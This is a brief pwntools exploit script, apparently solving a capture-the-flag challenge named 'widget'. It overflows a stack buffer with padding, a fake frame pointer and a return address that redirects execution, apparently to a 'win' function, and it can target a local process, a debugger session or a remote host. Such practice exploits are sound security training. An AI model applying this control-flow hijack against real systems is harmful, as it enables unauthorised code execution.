#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./widget"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+341
        b win
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


size = 0x40
payload = b'A' * 0x8 * 4
payload += p64(0x404500)
payload += p64(0x40130b)

p.sendlineafter(':', str(size))
p.sendlineafter(':', payload)



p.interactive()
